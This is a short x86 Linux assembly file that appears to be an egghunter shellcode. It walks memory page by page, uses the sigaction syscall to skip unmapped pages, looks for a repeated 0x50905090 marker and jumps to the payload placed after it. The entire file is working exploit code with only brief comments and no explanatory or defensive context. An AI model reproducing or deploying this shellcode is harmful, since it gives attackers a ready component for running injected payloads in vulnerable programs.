global _start

_start:

align_page:
    or cx,0xfff         ; page alignment


next_address:
    inc ecx
    push byte +0x43     ; sigaction(2)
    pop eax             
    int 0x80            
    cmp al,0xf2         ; EFAULT?
    jz align_page       
    mov eax, 0x50905090 
    mov edi, ecx        
    scasd               
    jnz next_address    
    scasd               
    jnz next_address    
    jmp edi  
	
